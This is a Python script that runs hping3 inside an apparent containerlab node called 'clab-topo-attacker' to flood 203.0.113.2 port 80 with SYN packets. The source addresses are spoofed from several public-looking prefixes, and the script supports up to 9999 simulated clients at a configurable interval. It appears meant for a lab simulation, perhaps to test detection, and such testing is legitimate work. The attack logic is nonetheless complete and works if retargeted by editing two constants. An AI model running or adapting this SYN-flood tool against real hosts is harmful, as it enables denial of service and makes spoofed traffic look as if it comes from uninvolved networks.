#!/usr/bin/env python3
"""Continuously send SYN packets from simulated source addresses."""

import asyncio
from contextlib import contextmanager
from datetime import datetime, timezone
import fcntl
import math
import os
import random
import re
import signal
import sys

INTERFACE = "eth1"
DESTINATION = "203.0.113.2"


CONTAINER = "clab-topo-attacker"
PREFIXES = ("37.120", "46.165", "62.210", "77.88", "89.160", "185.20")


def parse_arguments(arguments):
    if len(arguments) != 2:
        raise ValueError(f"Usage: {os.path.basename(sys.argv[0])} CLIENTS INTERVAL")
    clients, interval = arguments
    if not re.fullmatch(r"[1-9][0-9]{0,3}", clients):
        raise ValueError("CLIENTS must be an integer between 1 and 9999.")
    if not re.fullmatch(r"[0-9]+(?:\.[0-9]+)?", interval) or not math.isfinite(float(interval)):
        raise ValueError("INTERVAL must be a finite nonnegative number of seconds.")
    return int(clients), float(interval)


@contextmanager
def node_lock():
    with open(f"/tmp/{CONTAINER}-simulation.lock", "a") as lock:
        try:
            fcntl.flock(lock, fcntl.LOCK_EX | fcntl.LOCK_NB)
        except BlockingIOError:
            raise RuntimeError("A simulation is already running for this node.") from None
        yield


def allocate_ip(prefix, allocated):
    while True:
        host = random.randint(1, 65534)
        address = f"{prefix}.{host // 256}.{host % 256}"
        if address not in allocated:
            allocated.add(address)
            return address


async def docker(*arguments, processes, capture=False):
    # Track even a process whose creation overlaps cancellation of its worker.
    creation = asyncio.create_task(asyncio.create_subprocess_exec(
        "docker", "exec", CONTAINER, *arguments,
        stdout=asyncio.subprocess.PIPE if capture else asyncio.subprocess.DEVNULL,
        env={**os.environ, "LC_ALL": "C"},
    ))
    try:
        process = await asyncio.shield(creation)
    except asyncio.CancelledError:
        process = await creation
        processes.add(process)
        raise
    processes.add(process)
    return process


async def command(*arguments, processes, capture=False, check=True):
    process = await docker(*arguments, processes=processes, capture=capture)
    output, _ = await process.communicate()
    processes.discard(process)
    if check and process.returncode:
        raise RuntimeError(f"docker exec {CONTAINER} {' '.join(arguments)} failed ({process.returncode}).")
    return (output or b"").decode()


async def terminate(process):
    if process.returncode is None:
        try:
            process.terminate()
        except ProcessLookupError:
            pass
    try:
        await asyncio.wait_for(process.communicate(), timeout=5)
    except asyncio.TimeoutError:
        try:
            process.kill()
        except ProcessLookupError:
            pass
        await process.communicate()


def hping_interval(seconds):
    # Preserve hping's whole-second or microsecond interval representation.
    if seconds >= 1:
        return format(seconds, ".0f")
    microseconds = max(1, int(seconds * 1_000_000 + 0.5))
    return format(seconds, ".0f") if microseconds >= 1_000_000 else f"u{microseconds}"


async def attack_worker(client_id, address, interval, processes):
    process = await docker(
        "stdbuf", "-oL", "hping3", "--numeric", "--quiet", "--debug",
        "--interface", INTERFACE, "--syn", "--interval", hping_interval(interval),
        "--destport", "80", "--spoof", address, DESTINATION,
        processes=processes, capture=True,
    )
    # hping debug emits one hex line per send attempt, even without replies.
    async for line in process.stdout:
        if re.match(rb"^[0-9A-F][0-9A-F] ", line):
            timestamp = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
            print(f"{timestamp} attack={client_id} source={address} SYN {DESTINATION}:80", flush=True)
    await process.wait()
    processes.discard(process)


async def simulate(clients, interval):
    processes, workers = set(), []
    stopped = asyncio.Event()
    loop = asyncio.get_running_loop()
    signals = (signal.SIGINT, signal.SIGTERM, signal.SIGHUP)
    with node_lock():
        for sig in signals:
            loop.add_signal_handler(sig, stopped.set)
        stop_waiter = asyncio.create_task(stopped.wait())
        ready = False
        try:
            print(f"attack: clients={clients} interval={interval:g}s; press Ctrl+C to stop.", flush=True)
            await command("ip", "link", "show", "dev", INTERFACE, processes=processes)
            ready = True
            allocated = set()
            for index in range(clients):
                if stopped.is_set():
                    break
                address = allocate_ip(PREFIXES[index % len(PREFIXES)], allocated)
                if stopped.is_set():
                    break
                workers.append(asyncio.create_task(attack_worker(index + 1, address, interval, processes)))
                # Let workers start and detect early failures during initialization.
                await asyncio.sleep(0)
                if any(task.done() for task in workers):
                    raise RuntimeError("A worker exited unexpectedly; stopping simulation.")
            if workers and not stopped.is_set():
                await asyncio.wait([stop_waiter, *workers], return_when=asyncio.FIRST_COMPLETED)
                if not stopped.is_set():
                    raise RuntimeError("A worker exited unexpectedly; stopping simulation.")
        finally:
            # Repeated signals must not interrupt cleanup.
            try:
                for task in [stop_waiter, *workers]:
                    task.cancel()
                await asyncio.gather(stop_waiter, *workers, return_exceptions=True)
                await asyncio.gather(*(terminate(process) for process in processes))
                processes.clear()
                errors = []
                if ready:
                    # Killing the local Docker client does not stop the remote command.
                    try:
                        await command("pkill", "-TERM", "-x", "hping3",
                                      processes=processes, check=False)
                    except OSError as error:
                        errors.append(str(error))
                if errors:
                    raise RuntimeError("Cleanup failed: " + "; ".join(errors))
            finally:
                for sig in signals:
                    loop.remove_signal_handler(sig)


def main():
    try:
        clients, interval = parse_arguments(sys.argv[1:])
        asyncio.run(simulate(clients, interval))
    except (ValueError, RuntimeError, OSError) as error:
        print(f"attack: {error}", file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
